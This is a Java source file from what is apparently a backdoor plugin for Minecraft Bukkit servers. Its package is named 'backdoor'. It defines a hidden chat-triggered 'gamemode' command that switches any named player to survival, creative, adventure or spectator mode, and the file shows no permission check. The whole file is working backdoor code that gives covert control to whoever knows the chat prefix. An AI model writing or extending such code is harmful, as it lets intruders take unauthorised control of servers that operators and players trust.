package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "gamemode",
        usage = {"<prefix> <command> <player> <gamemode>"},
        description = "Tells you what this command does",
        aliases = {"gamemode", "gm"})
public class GamemodeCommand extends Command {

    public GamemodeCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) { // Command: <prefix>gamemode [player] [gamemode]
        Player player;
        try {
            player = Bukkit.getPlayer(args.get(0));
        } catch (Exception e) {
            Main.logger.log("Failed to get player");
            if (args.get(0) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not a player");
            }
            Main.logger.log("Defaulting to the player who sent the command");
            try {
                player = event.getPlayer();
            } catch (Exception e2) {
                Main.logger.log(" Failed to set player to command sender \nEXCEPTION: " + e2);
                return;
            }
        }

        GameMode gameMode;
        switch (args.get(1)) {
            case "survival", "s", "0" -> {
                gameMode = GameMode.SURVIVAL;
            }
            case "creative", "c", "1" -> {
                gameMode = GameMode.CREATIVE;
            }
            case "adventure", "a", "2" -> {
                gameMode = GameMode.ADVENTURE;
            }
            case "spectator", "sp", "3" -> {
                gameMode = GameMode.SPECTATOR;
            }
            default -> {
                Main.logger.log("Failed to get gamemode");
                if (args.get(1) == null) {
                    Main.logger.log(NOT_ENOUGH_ARGS);
                } else {
                    Main.logger.log("That is not a gamemode");
                }
                Main.logger.log("Defaulting to survival");
                gameMode = GameMode.SURVIVAL;
            }
        }

        try {
            player.setGameMode(gameMode);
        } catch (Exception e) {
            Main.logger.log("Failed to change gamemode on " + player.getName());
            return;
        }
    }
}
